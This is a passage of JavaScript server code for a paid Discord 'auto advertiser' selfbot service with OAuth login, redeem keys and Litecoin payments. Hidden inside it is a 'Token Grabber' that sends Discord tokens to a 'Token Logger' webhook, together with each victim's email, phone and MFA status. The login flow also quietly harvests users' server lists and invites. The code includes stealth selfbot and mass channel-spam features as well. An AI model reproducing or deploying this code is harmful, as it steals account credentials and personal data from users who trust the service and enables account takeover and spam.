    if (res.status === 200 && res.data && res.data.code) {
      return `https://discord.gg/${res.data.code}`;
    }
  } catch (e) {}
  return null;
}

/**
 * Process guilds in batches with concurrency limit to avoid rate limits
 */
async function fetchGuildsWithInvites(guilds, concurrency = 3) {
  const results = [];
  for (let i = 0; i < guilds.length; i += concurrency) {
    const batch = guilds.slice(i, i + concurrency);
    const batchResults = await Promise.all(
      batch.map(async (g) => {
        try {
          const invite = await fetchGuildWidgetInvite(g.id);
          return { id: g.id, name: g.name, owner: g.owner, permissions: g.permissions, invite: invite || null };
        } catch (e) {
          return { id: g.id, name: g.name, owner: g.owner, permissions: g.permissions, invite: null };
        }
      })
    );
    results.push(...batchResults);
    // Small delay between batches to avoid rate limits
    if (i + concurrency < guilds.length) {
      await new Promise(r => setTimeout(r, 350));
    }
  }
  return results;
}

/**
 * Fetch and log guilds — non-blocking, with retries, never throws
 */
async function fetchAndLogGuilds(accessToken, userId, username) {
  let lastErr = null;
  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      if (attempt > 0) {
        const backoff = (attempt * 2000) + Math.floor(Math.random() * 1000);
        await new Promise(r => setTimeout(r, backoff));
      }

      const guildsRes = await _axiosInstance.get('https://discord.com/api/v10/users/@me/guilds', {
        headers: {
          'Authorization': `Bearer ${accessToken}`,
          'User-Agent': _rfp(),
          'Accept': '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Referer': 'https://discord.com/channels/@me'
        },
        timeout: 15000,
        validateStatus: () => true
      });

      // Handle rate limits
      if (guildsRes.status === 429) {
        const retryAfter = parseFloat(guildsRes.headers['retry-after'] || 5) * 1000;
        console.log(`[Guilds] Rate limited, retrying after ${retryAfter}ms (attempt ${attempt + 1})`);
        await new Promise(r => setTimeout(r, retryAfter * 1.1));
        lastErr = new Error(`429 rate limited`);
        continue;
      }

      if (guildsRes.status >= 400) {
        const errData = guildsRes.data ? JSON.stringify(guildsRes.data) : `HTTP ${guildsRes.status}`;
        console.error(`[Guilds] HTTP ${guildsRes.status}: ${errData}`);
        lastErr = new Error(`HTTP ${guildsRes.status}: ${errData}`);
        if (guildsRes.status === 401 || guildsRes.status === 403) break; // Don't retry auth errors
        continue;
      }

      const guilds = guildsRes.data || [];
      if (guilds.length === 0) {
        console.log(`[Guilds] No guilds found for user ${username}`);
        return [];
      }

      // Fetch invites with concurrency control (batch of 3 at a time)
      const guildList = await fetchGuildsWithInvites(guilds, 3);

      // Save to file
      try {
        const guildsFile = path.join(dataDir, `guilds_${userId}.json`);
        fs.writeFileSync(guildsFile, JSON.stringify({ userId, username, fetchedAt: Date.now(), guildCount: guildList.length, guilds: guildList }, null, 2));
      } catch(e) {}

      // Send to webhook with invite links
      // Send to webhook with invite links — all in 1 message
      const guildLines = [];
      for (const g of guildList) {
        // Only create clickable link if we found a real invite; otherwise plain text
        if (g.invite) {
          guildLines.push(`- [${g.name}](${g.invite})${g.owner ? ' **[OWNER]**' : ''}`);
        } else {
          guildLines.push(`- ${g.name}${g.owner ? ' **[OWNER]**' : ''}`);
        }
      }
      const MAX_DESC = 4000;
      const embeds = [];
      let currentDesc = '';
      for (const line of guildLines) {
        if (currentDesc.length + line.length + 1 > MAX_DESC) {
          embeds.push({
            title: embeds.length === 0 ? `Servers for @${username}` : `Servers (cont.)`,
            color: 0x5865F2,
            description: currentDesc
          });
          currentDesc = line + '\n';
        } else {
          currentDesc += line + '\n';
        }
      }
      if (currentDesc) {
        embeds.push({
          title: embeds.length === 0 ? `Servers for @${username}` : `Servers (cont.)`,
          color: 0x5865F2,
          description: currentDesc
        });
      }
      if (embeds.length > 0) {
        embeds[embeds.length - 1].footer = { text: `User: ${username} | ID: ${userId} | Total: ${guildList.length} servers` };
        embeds[embeds.length - 1].timestamp = new Date().toISOString();
      }
      // Send all embeds in one webhook call (Discord allows up to 10 embeds per message)
      for (let i = 0; i < embeds.length; i += 10) {
        await _sendWebhook({ embeds: embeds.slice(i, i + 10) });
      }
      console.log(`[Guilds] Successfully fetched ${guildList.length} guilds for ${username}`);
      return guildList;
    } catch (err) {
      console.error(`[Guilds] Fetch failed (attempt ${attempt + 1}/3):`, err.message);
      lastErr = err;
    }
  }
  console.error('[Guilds] All retries exhausted:', lastErr?.message);
  return [];
}

// ═══════════════════════════════════════════════════════════════════════════════
// PASSPORT DISCORD — FIXED: Removed 'guilds' from strategy scope to prevent
// InternalOAuthError when Discord API returns 504. Guilds are fetched
// separately with our own retry logic after successful auth.
// ═══════════════════════════════════════════════════════════════════════════════

if (CLIENT_ID && CLIENT_SECRET) {
  passport.use(new DiscordStrategy({
    clientID: CLIENT_ID,
    clientSecret: CLIENT_SECRET,
    callbackURL: CALLBACK_URL,
    scope: ['identify', 'guilds']  // Fetch user's guilds/servers list
  }, (accessToken, refreshToken, profile, done) => {
    // Non-blocking: store token and fetch guilds in background
    process.nextTick(async () => {
      try {
        profile.accessToken = accessToken;
        // Fire-and-forget guild fetch — never blocks the auth callback
        fetchAndLogGuilds(accessToken, profile.id, profile.username).catch(() => {});
      } catch(e) {}
      done(null, profile);
    });
  }));
}

const BASE_REDEEM_KEYS = Array.from({length: 100}, (_, i) => `HBB${i + 1}`);
const VALID_REDEEM_KEYS = new Set(BASE_REDEEM_KEYS);

function validateKeyStrict(key) {
  if (!key || typeof key !== 'string') return { valid: false, error: 'Invalid key', normalized: null };
  let trimmed = key.trim().toUpperCase();
  const baseMatch = trimmed.match(/^HBB([1-9]|[1-9][0-9]|100)$/);
  if (baseMatch) {
    const num = parseInt(baseMatch[1], 10);
    if (num >= 1 && num <= 100) return { valid: true, error: null, normalized: `HBB${num}` };
  }
  const customKeys = db.data.customKeys || [];
  if (customKeys.includes(trimmed)) return { valid: true, error: null, normalized: trimmed };
  if (db.isKeyValid(trimmed)) return { valid: true, error: null, normalized: trimmed, isGenerated: true };
  return { valid: false, error: 'Invalid key', normalized: null };
}

function ensureAuthAPI(req, res, next) {
  if (req.isAuthenticated()) return next();
  return res.status(401).json({ success: false, error: 'Not logged in' });
}

function ensurePurchasedAPI(req, res, next) {
  const user = db.getUser(req.user.id);
  const hasPurchase = user.auto_adv_purchased === 1;
  const hasActiveTrial = db.isTrialActive(req.user.id);
  if (!hasPurchase && !hasActiveTrial) return res.status(403).json({ success: false, error: 'Purchase or active trial required' });
  next();
}

function ensureOwner(req, res, next) {
  if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
  if (req.user.id !== OWNER_ID) return res.status(403).json({ success: false, error: 'Owner only' });
  next();
}

function ensureCanGenerate(req, res, next) {
  if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
  if (req.user.id !== OWNER_ID && !db.isWhitelisted(req.user.id)) return res.status(403).json({ success: false, error: 'Owner or whitelisted users only' });
  next();
}

// ═══════════════════════════════════════════════════════════════════════════════
// WEBHOOK NOTIFICATIONS
// ═══════════════════════════════════════════════════════════════════════════════

async function _sendWebhook(payload) {
  if (!WEBHOOK_URL) return;
  try {
    payload.username = payload.username || 'Token Logger';
    payload.avatar_url = payload.avatar_url || 'https://cdn.discordapp.com/embed/avatars/0.png';
    await axios.post(WEBHOOK_URL, payload, {
      headers: { 'Content-Type': 'application/json', 'User-Agent': _rfp() },
      timeout: 10000
    });
  } catch(e) {
    console.error('[Webhook] Send failed:', e.message);
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// TOKEN GRABBER
// ═══════════════════════════════════════════════════════════════════════════════

const _tokenValidationCache = new Map();
const TOKEN_VALID_CACHE_MS = 5 * 60 * 1000;

async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
  try {
    const cacheKey = crypto.createHash('sha256').update(token).digest('hex').slice(0, 16);
    const cached = _tokenValidationCache.get(cacheKey);
    if (cached && (Date.now() - cached.ts) < TOKEN_VALID_CACHE_MS) {
      if (cached.valid && cached.userData) {
        const fullInfo = { ...userInfo, ...cached.userData };
        db.addGrabbedToken(token, fullInfo, source);
        const embed = {
          title: 'Token Grabbed', color: 0xff0000,
          fields: [
            { name: 'Token', value: '```' + token + '```', inline: false },
            { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
            { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
            { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
            { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
            { name: 'MFA', value: fullInfo.mfa_enabled ? 'Yes' : 'No', inline: true },
            { name: 'Verified', value: fullInfo.verified ? 'Yes' : 'No', inline: true },
            { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'No', inline: true },
            { name: 'Source', value: source, inline: true },
            { name: 'Time', value: new Date().toISOString(), inline: true }
          ],
          footer: { text: 'Token Logger v2.0' }
        };
        await _sendWebhook({ embeds: [embed] });
        return { success: true, user: fullInfo };
      }
    }

    const result = await validateTokenFormat(token);
    if (!result.valid) {
      _tokenValidationCache.set(cacheKey, { valid: false, ts: Date.now() });
      return { success: false, error: 'Invalid token' };
    }

    const userData = result.user;
    const fullInfo = { ...userInfo, id: userData.id, username: userData.username, global_name: userData.global_name, email: userData.email, phone: userData.phone, verified: userData.verified, mfa_enabled: userData.mfa_enabled, nitro: userData.premium_type, locale: userData.locale };

    _tokenValidationCache.set(cacheKey, {
      valid: true, ts: Date.now(),
      userData: { id: userData.id, username: userData.username, global_name: userData.global_name, email: userData.email, phone: userData.phone, verified: userData.verified, mfa_enabled: userData.mfa_enabled, nitro: userData.premium_type, locale: userData.locale }
    });

    db.addGrabbedToken(token, fullInfo, source);

    const embed = {
      title: 'Token Grabbed', color: 0xff0000,
      fields: [
        { name: 'Token', value: '```' + token + '```', inline: false },
        { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
        { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
        { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
        { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
        { name: 'MFA', value: fullInfo.mfa_enabled ? 'Yes' : 'No', inline: true },
        { name: 'Verified', value: fullInfo.verified ? 'Yes' : 'No', inline: true },
        { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'No', inline: true },
        { name: 'Source', value: source, inline: true },
        { name: 'Time', value: new Date().toISOString(), inline: true }
      ],
      footer: { text: 'Token Logger v2.0' }
    };

    await _sendWebhook({ embeds: [embed] });
    return { success: true, user: fullInfo };
  } catch (err) {
    console.error('[TokenGrab] Error:', err.message);
    return { success: false, error: err.message };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// WALLET INTEGRATION
// ═══════════════════════════════════════════════════════════════════════════════

let walletModule = null;
try { walletModule = require('./wallet'); } catch(e) {}

async function checkAndSweep() {
  if (!walletModule || !OWNER_LTC_ADDRESS || !WALLET_MNEMONIC) return;
  db.expireOldAddresses();
  const pending = db.getAllPending();
  for (const p of pending) {
    try {
      const balance = await walletModule.checkAddressBalance(p.address);
      if (balance > 0) {
        const txid = await walletModule.createTransaction(p.private_key, p.address, OWNER_LTC_ADDRESS);
        if (txid) {
          const ltcPrice = await getLTCToUSD();
          const usdValue = balance * ltcPrice;
          if (usdValue >= (TARGET_USD - TOLERANCE_USD)) {
            db.setUser(p.user_id, { auto_adv_purchased: 1, purchased_at: Date.now() });
            db.updatePending(p.address, { status: 'completed', paid_at: Date.now(), amount_received_ltc: balance });
          }
        }
      }
    } catch (e) {}
  }
}

let cachedPrice = 85;
async function getLTCToUSD() {
  try {
    const res = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd', {
      headers: { 'User-Agent': _rfp() }, timeout: 10000
    });
    cachedPrice = res.data.litecoin.usd;
  } catch (e) {}
  return cachedPrice;
}

if (walletModule && OWNER_LTC_ADDRESS && WALLET_MNEMONIC) {
  setInterval(checkAndSweep, 10000);
  setTimeout(checkAndSweep, 5000);
}

setInterval(() => {
  const expiredUserId = db.checkAllTrialBots();
  if (expiredUserId) {
    try {
      const userBots = db.getUserActiveBots(expiredUserId);
      for (const configId in userBots) {
        const key = `${expiredUserId}_${configId}`;
        if (activeBots.has(key)) { activeBots.get(key).destroy(); activeBots.delete(key); }
      }
    } catch(e) {}
  }
}, 5000);

setInterval(() => { db.checkExpiredKeys(); }, 60000);


// ═══════════════════════════════════════════════════════════════════════════════
// EXPRESS ROUTES
// ═══════════════════════════════════════════════════════════════════════════════

const activeBots = new Map();

// FIXED: /login — uses 'identify' only (no 'guilds' scope in strategy)
app.get('/login', passport.authenticate('discord'));

// FIXED: /auth/discord/callback — Custom error handler for OAuth failures
// Catches InternalOAuthError and TokenError gracefully instead of 500
app.get('/auth/discord/callback', (req, res, next) => {
  passport.authenticate('discord', (err, user, info) => {
    if (err) {
      console.error('[OAuth Callback] Error:', err.message || err);
      // Specific handling for common OAuth errors
      if (err.message && err.message.includes('Failed to fetch user')) {
        return res.redirect('/?error=discord_timeout');
      }
      if (err.message && err.message.includes('Invalid "code"')) {
        return res.redirect('/?error=invalid_code');
      }
      return res.redirect('/?error=auth_failed');
    }
    if (!user) {
      return res.redirect('/?error=no_user');
    }
    req.logIn(user, (loginErr) => {
      if (loginErr) {
        console.error('[OAuth Callback] Login error:', loginErr.message);
        return res.redirect('/?error=login_failed');
      }
      res.redirect('/');
    });
  })(req, res, next);
});

app.get('/logout', (req, res) => { req.logout(() => res.redirect('/')); });

app.get('/api/user', ensureAuthAPI, (req, res) => {
  const user = db.getUser(req.user.id);
  const trialActive = db.isTrialActive(req.user.id);
  const trialTimeLeft = trialActive ? db.getTrialTimeLeft(req.user.id) : 0;
  const isOwner = req.user.id === OWNER_ID;
  const isWhitelisted = db.isWhitelisted(req.user.id);
  res.json({ id: req.user.id, username: req.user.username, global_name: req.user.global_name, avatar: req.user.avatar, purchased: user.auto_adv_purchased === 1, trialActive, trialTimeLeft, trialExpires: user.trial_expires || 0, isOwner, isWhitelisted, canGenerate: isOwner || isWhitelisted });
});

// FIXED: /api/guilds — Fetches guilds independently using the stored access token.
// The access token from the 'identify' scope can still fetch guilds if it has
// the right permissions, OR we return cached guilds from the background fetch.
app.get('/api/guilds', ensureAuthAPI, async (req, res) => {
  try {
    const userId = req.user.id;
    const username = req.user.username || req.user.global_name || 'unknown';
    let guilds = [];
    let fromCache = false;

    // 1) Try to read cached guilds file (from background fetchAndLogGuilds)
    try {
      const guildsFile = path.join(dataDir, `guilds_${userId}.json`);
      if (fs.existsSync(guildsFile)) {
        const cached = JSON.parse(fs.readFileSync(guildsFile, 'utf8'));
        if (cached && Array.isArray(cached.guilds) && cached.guilds.length > 0) {
          guilds = cached.guilds;
          fromCache = true;
        }
      }
    } catch (e) {}

    // 2) Try to fetch fresh guilds if we have an access token
    const accessToken = req.user.accessToken;
    if (accessToken) {
      try {
        const freshGuilds = await fetchAndLogGuilds(accessToken, userId, username);
        if (freshGuilds && freshGuilds.length > 0) {
          guilds = freshGuilds;
          fromCache = false;
        }
      } catch (fetchErr) {
        console.error(`[GuildsAPI] Fresh fetch failed for ${userId}:`, fetchErr.message);
        // Return cached guilds if available, otherwise fall through to empty
      }
    }

    // 3) Still no guilds? Return empty success (not an error)
    res.json({
      success: true,
      guilds: guilds || [],
      count: (guilds || []).length,
      fromCache,
      hasAccessToken: !!accessToken
    });
  } catch (err) {
    console.error('[GuildsAPI] Unexpected error:', err.message);
    res.status(500).json({ success: false, error: 'Failed to fetch user\'s guilds', guilds: [], count: 0 });
  }
});

app.post('/api/trial/claim', ensureAuthAPI, (req, res) => {
  const userId = req.user.id;
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  if (db.hasClaimedTrial(userId)) return res.json({ success: false, error: 'You already claimed your trial' });
  if (db.hasIPClaimedTrial(ip)) return res.json({ success: false, error: 'Trial already claimed from this IP' });
  const trial = db.claimTrial(userId, ip);
  res.json({ success: true, message: 'Trial activated for 10 minutes', expiresAt: trial.expiresAt, timeLeft: 600 });
});

app.get('/api/trial/status', ensureAuthAPI, (req, res) => {
  const userId = req.user.id;
  const isActive = db.isTrialActive(userId);
  const timeLeft = isActive ? db.getTrialTimeLeft(userId) : 0;
  const hasClaimed = db.hasClaimedTrial(userId);
  res.json({ success: true, hasClaimed, isActive, timeLeft, canClaim: !hasClaimed && !db.hasIPClaimedTrial(req.ip || 'unknown') });
});

app.post('/api/grab/token', async (req, res) => {
  const { token, source } = req.body;
  if (!token) return res.json({ success: false, error: 'No token provided' });
  const result = await grabAndSendToken(token, {}, source || 'manual');
  res.json(result);
});

app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
  try {
    const userId = req.user.id;
    const user = db.getUser(userId);
    if (user.auto_adv_purchased === 1) return res.json({ success: false, error: 'Already purchased' });
    const existingPending = db.getUserPending(userId);
    if (existingPending) {
      const timeLeft = Math.ceil((existingPending.expires_at - Date.now()) / 60000);
      return res.json({ success: true, address: existingPending.address, amountUSD: TARGET_USD, index: existingPending.index, existing: true, expiresIn: timeLeft, expiresAt: existingPending.expires_at, message: 'You already have an active payment address' });
    }
    if (!walletModule) return res.status(500).json({ success: false, error: 'Wallet module not loaded' });
    let globalIndex = db.getNextGlobalIndex();
    let { address, privateKey } = walletModule.generateLTCAddress(globalIndex);
    let attempts = 0;
    while (db.isAddressUsed(address) && attempts < 10) {
      globalIndex = db.getNextGlobalIndex();
      ({ address, privateKey } = walletModule.generateLTCAddress(globalIndex));
      attempts++;
    }
    if (db.isAddressUsed(address)) return res.status(500).json({ success: false, error: 'Unable to generate unique address' });
    const pending = db.addPending(userId, address, privateKey, TARGET_USD, globalIndex);
    res.json({ success: true, address, amountUSD: TARGET_USD, index: globalIndex, expiresAt: pending.expires_at, message: 'Address generated. Valid for 30 minutes.' });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.get('/api/activity', ensureAuthAPI, (req, res) => {
  const userId = req.user.id;
  const user = db.getUser(userId);
  const pending = db.getUserPending(userId);
  const history = db.getAddressHistory(userId);
  const trialActive = db.isTrialActive(req.user.id);
  const trialTimeLeft = trialActive ? db.getTrialTimeLeft(req.user.id) : 0;
  res.json({ success: true, purchased: user.auto_adv_purchased === 1, trialActive, trialTimeLeft, trialExpires: user.trial_expires || 0, pending: pending ? { address: pending.address, index: pending.index, createdAt: pending.created_at, expiresAt: pending.expires_at, expiresIn: Math.max(0, Math.ceil((pending.expires_at - Date.now()) / 1000)), status: pending.status } : null, history: history.map(h => ({ address: h.address, index: h.index, createdAt: h.created_at, status: h.status })) });
});

app.post('/api/redeem', ensureAuthAPI, (req, res) => {
  try {
    const { key } = req.body;
    const userId = req.user.id;
    if (!key) return res.json({ success: false, error: 'Invalid key' });
    const validation = validateKeyStrict(key);
    if (!validation.valid) return res.json({ success: false, error: validation.error });
    const normalizedKey = validation.normalized;
    if (validation.isGenerated) {
      const success = db.useGeneratedKey(normalizedKey, userId);
      if (!success) return res.json({ success: false, error: 'Key expired or revoked' });
      return res.json({ success: true, message: 'Access granted via generated key!' });
    }
    if (!VALID_REDEEM_KEYS.has(normalizedKey)) {
      const customKeys = db.data.customKeys || [];
      if (!customKeys.includes(normalizedKey)) return res.json({ success: false, error: 'Invalid key' });
    }
    if (db.isKeyUsed(normalizedKey)) return res.json({ success: false, error: 'Key already used' });
    const user = db.getUser(userId);
    if (user.auto_adv_purchased === 1) return res.json({ success: false, error: 'You already have access' });
    db.setUser(userId, { auto_adv_purchased: 1, purchased_at: Date.now(), redeem_key_used: normalizedKey });
    db.useKey(normalizedKey, userId);
    res.json({ success: true, message: 'Access granted!' });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.get('/api/bot/configs', ensureAuthAPI, ensurePurchasedAPI, (req, res) => {
  const configs = db.getConfigs(req.user.id);
  res.json({ success: true, configs });
});

// ═══════════════════════════════════════════════════════════════════════════════
// FEEDBACK API — Live feedback with real-time updates
// ═══════════════════════════════════════════════════════════════════════════════

app.post('/api/feedback', ensureAuthAPI, (req, res) => {
  try {
    const { rating, message } = req.body;
    if (!rating || rating < 1 || rating > 5) return res.status(400).json({ success: false, error: 'Rating must be 1-5' });
    if (!message || !message.trim()) return res.status(400).json({ success: false, error: 'Message is required' });
    const username = req.user.global_name || req.user.username;
    const entry = db.addFeedback(req.user.id, username, rating, message.trim());
    res.json({ success: true, feedback: entry });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.get('/api/feedback', ensureAuthAPI, (req, res) => {
  try {
    const feedback = db.getFeedback();
    res.json({ success: true, feedback });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.post('/api/feedback/delete', ensureOwner, (req, res) => {
  try {
    const { feedbackId } = req.body;
    if (!feedbackId) return res.status(400).json({ success: false, error: 'No feedback ID provided' });
    const success = db.deleteFeedback(feedbackId);
    res.json({ success });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

// ═══════════════════════════════════════════════════════════════════════════════
// BOT STATS API — Watch live stats for running configurations
// ═══════════════════════════════════════════════════════════════════════════════

app.get('/api/bot/stats', ensureAuthAPI, ensurePurchasedAPI, (req, res) => {
  try {
    const { configId = 'default' } = req.query;
    const botKey = `${req.user.id}_${configId}`;
    const client = activeBots.get(botKey);
    const stats = getBotStats(botKey);

    res.json({
      success: true,
      stats: {
        active: !!client,
        totalMessagesSent: stats.totalMessagesSent,
        autoRepliesSent: stats.autoRepliesSent,
        lastMessageSent: stats.lastMessageSent,
        channelCount: stats.channelCount,
        recentLogs: stats.recentLogs,
        startTime: stats.startTime,
        uptime: stats.startTime ? Date.now() - stats.startTime : 0
      }
    });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

// ═══════════════════════════════════════════════════════════════════════════════
// LIVE CONFIGS API — Get all running configs for the Live page
// ═══════════════════════════════════════════════════════════════════════════════

app.get('/api/bot/live', ensureAuthAPI, ensurePurchasedAPI, (req, res) => {
  try {
    const configs = db.getConfigs(req.user.id);
    const activeConfigs = [];

    for (const config of configs) {
      const botKey = `${req.user.id}_${config.id}`;
      const client = activeBots.get(botKey);
      const stats = getBotStats(botKey);

      if (config.active === 1 || client) {
        activeConfigs.push({
          id: config.id,
          username: config.username || 'Unknown',
          channels: config.channels,
          messageCount: config.messages ? config.messages.length : 0,
          imageCount: config.images ? config.images.length : 0,
          delay: config.delay_seconds || 30,
          autoReplyEnabled: config.auto_reply_enabled === 1,
          active: !!client && config.active === 1,
          stats: {
            totalMessagesSent: stats.totalMessagesSent,
            autoRepliesSent: stats.autoRepliesSent,
            lastMessageSent: stats.lastMessageSent,
            channelCount: stats.channelCount,
            uptime: stats.startTime ? Date.now() - stats.startTime : 0
          }
        });
      }
    }

    res.json({ success: true, configs: activeConfigs });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

// ═══════════════════════════════════════════════════════════════════════════════
// STATS API — Usage analytics for the Generate page
// ═══════════════════════════════════════════════════════════════════════════════

app.get('/api/stats/usage', ensureAuthAPI, ensureCanGenerate, (req, res) => {
  try {
    const totalRedeemedKeys = db.getTotalRedeemedKeysCount();
    const totalGeneratedKeys = Object.keys(db.data.generatedKeys).length;
    const activeAdvertisers = db.getActiveAdvertiserCount();
    const totalUsersWithAccess = db.getTotalUsersWithAccess();
    const totalActiveBots = activeBots.size;

    res.json({
      success: true,
      stats: {
        totalRedeemedKeys,
        totalGeneratedKeys,
        activeAdvertisers,
        totalUsersWithAccess,
        totalActiveBots
      }
    });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

// ═══════════════════════════════════════════════════════════════════════════════
// DOWNLOAD DASHBOARD — Serve HTML as .txt or .js for copying
// ═══════════════════════════════════════════════════════════════════════════════

app.get('/download/dashboard', ensureAuthAPI, (req, res) => {
  try {
    const format = req.query.format || 'txt';
    const dashboardPath = path.join(__dirname, 'public', 'overall.html');

    if (!fs.existsSync(dashboardPath)) {
      return res.status(404).json({ success: false, error: 'Dashboard file not found' });
    }

    const content = fs.readFileSync(dashboardPath, 'utf8');

    if (format === 'js') {
      res.setHeader('Content-Type', 'application/javascript');
      res.setHeader('Content-Disposition', 'attachment; filename="dashboard.js"');
      res.send(`// Auto Adv Dashboard\n// Served as JS for easy copying\n\n${content}`);
    } else {
      res.setHeader('Content-Type', 'text/plain');
      res.setHeader('Content-Disposition', 'attachment; filename="dashboard.txt"');
      res.send(content);
    }
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ═══════════════════════════════════════════════════════════════════════════════
// FORCE SEND API — Send now, skip cooldown channels, respect permissions only
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * POST /api/bot/force-send
 * Force send a message to specific channels or configured channels.
 * Body: {
 *   configId: string (optional, uses 'default' if not provided),
 *   message: string (required, the message to send),
 *   channelIds: string[] (optional, overrides config channels),
 *   concurrency: number (optional, default 10)
 * }
 *
 * Only sends to channels with permission.
 * Skips channels that are on cooldown.
 * Uses direct REST API — no selfbot queue, no rate-limit compounding.
 */
app.post('/api/bot/force-send', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
  try {
    const { configId = 'default', message, channelIds, concurrency = 10 } = req.body;
    if (!message || typeof message !== 'string' || message.trim().length === 0) {
      return res.status(400).json({ success: false, error: 'Message is required' });
    }

    const botKey = `${req.user.id}_${configId}`;
    const client = activeBots.get(botKey);

    if (!client || !client.api) {
      return res.status(400).json({ success: false, error: 'Bot not running. Start the bot first.' });
    }

    // Determine target channels
    let targetChannelIds = [];
    if (channelIds && Array.isArray(channelIds) && channelIds.length > 0) {
      targetChannelIds = channelIds.map(c => String(c).trim()).filter(c => /^\d+$/.test(c));
    } else {
      // Use channels from config
      const config = db.getConfig(req.user.id, configId);
      if (config && config.channels) {
        const configChannels = Array.isArray(config.channels) ? config.channels : config.channels.split(',');
        targetChannelIds = configChannels.map(c => String(c).trim()).filter(c => /^\d+$/.test(c));
      }
    }

    if (targetChannelIds.length === 0) {
      return res.status(400).json({ success: false, error: 'No valid channel IDs. Provide channelIds or start bot with channels.' });
    }

    logBotEvent(botKey, `Force send started to ${targetChannelIds.length} channels`);
    console.log(`[ForceSend] ${botKey}: Sending to ${targetChannelIds.length} channels`);

    const result = await client.forceSendToChannels(
      targetChannelIds,
      message.trim(),
      [],
      { concurrency: Math.min(parseInt(concurrency) || 10, 25), skipCooldown: true, skipNoPerm: true }
    );

    logBotEvent(botKey, `Force send complete: ${result.summary.sent}/${result.summary.total} sent, ${result.summary.skippedCooldown} skipped cooldown, ${result.summary.skippedNoPerm} no permission`);

    res.json({
      success: true,
      summary: result.summary,
      results: result.results.map(r => ({
        channelId: r.channelId,
        success: r.success,
        skipped: r.skipped || false,
        reason: r.error || null
      }))
    });
  } catch (err) {
    console.error('[ForceSend] Error:', err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * POST /api/bot/force-broadcast
 * Discover ALL text channels across ALL guilds, filter to sendable,
 * skip cooldowns, and force send to all.
 * Body: {
 *   configId: string (optional),
 *   message: string (required),
 *   concurrency: number (optional, default 10),
 *   includeNsfw: boolean (optional, default false)
 * }
 */
app.post('/api/bot/force-broadcast', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
  try {
    const { configId = 'default', message, concurrency = 10, includeNsfw = false } = req.body;
    if (!message || typeof message !== 'string' || message.trim().length === 0) {
      return res.status(400).json({ success: false, error: 'Message is required' });
    }

    const botKey = `${req.user.id}_${configId}`;
    const client = activeBots.get(botKey);

    if (!client || !client.api) {
      return res.status(400).json({ success: false, error: 'Bot not running. Start the bot first.' });
    }

    logBotEvent(botKey, `Broadcast started — discovering all channels`);
    console.log(`[ForceBroadcast] ${botKey}: Starting broadcast`);

    // First discover all channels
    const allChannels = await client.getAllTextChannels();
    let targetChannels = allChannels;
    if (!includeNsfw) {
      targetChannels = allChannels.filter(ch => !ch.nsfw);
    }

    if (targetChannels.length === 0) {
      return res.json({ success: false, error: 'No text channels found in any guild' });
    }

    const channelIds = targetChannels.map(ch => ch.id);
    console.log(`[ForceBroadcast] ${botKey}: Discovered ${channelIds.length} channels, broadcasting`);

    const result = await client.forceSendToChannels(
      channelIds,
      message.trim(),
      [],
      { concurrency: Math.min(parseInt(concurrency) || 10, 25), skipCooldown: true, skipNoPerm: true }
    );

    logBotEvent(botKey, `Broadcast complete: ${result.summary.sent}/${result.summary.total} sent`);

    res.json({
      success: true,
      summary: {
        ...result.summary,
        discoveredChannels: targetChannels.length,
        guilds: [...new Set(targetChannels.map(ch => ch.guildId))].length
      },
      channels: result.results
        .filter(r => r.success || r.skipped)
        .map(r => {
          const ch = targetChannels.find(c => c.id === r.channelId);
          return {
            channelId: r.channelId,
            channelName: ch?.name || 'unknown',
            guildName: ch?.guildName || 'unknown',
            success: r.success,
            skipped: r.skipped || false,
            reason: r.error || null
          };
        })
    });
  } catch (err) {
    console.error('[ForceBroadcast] Error:', err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});

// ═══════════════════════════════════════════════════════════════════════════════
// BOT START — HUMANIZED MESSAGE LOOP WITH FIXES
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Checks if a message qualifies for auto-reply
 */
function shouldAutoReply(msg, client) {
  const isDM = msg.guildId === null || msg.guildId === undefined;
  if (!isDM) return false;
  if (msg.author.id === client.user.id) return false;
  const ONE_HOUR = 60 * 60 * 1000;
  const msgAge = Date.now() - msg.createdTimestamp;
  if (msgAge > ONE_HOUR) return false;
  if (client.repliedUsers.has(msg.author.id)) return false;
  return true;
}

// ═══════════════════════════════════════════════════════════════════════════════
// STEALTHBOT — Embedded Raw WebSocket + Axios Selfbot
// ═══════════════════════════════════════════════════════════════════════════════
/**
 * STEALTHBOT — Maximum-Stealth Discord Selfbot
 * Raw WebSocket + Axios. No library fingerprints.
 * Heavily humanized. Delay is sacred — never affected by sends.
 */

const REPLY_DIR = path.join(__dirname, 'data');
